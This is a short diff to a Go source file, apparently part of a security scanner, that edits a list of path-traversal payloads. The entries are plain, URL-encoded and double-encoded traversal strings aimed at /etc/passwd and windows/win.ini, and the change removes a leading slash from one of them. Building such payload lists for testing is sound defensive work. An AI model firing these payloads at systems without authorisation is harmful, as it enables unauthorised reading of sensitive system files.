@@ -51,7 +51,7 @@ var payloads = []string{
 	"/etc/passwd",
 	"////etc/passwd",
 	"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
-	"/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/win.ini",
+	"..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fwindows/win.ini",
 	"../../../../../../../../../../../../../../windows/win.ini",
 }
 
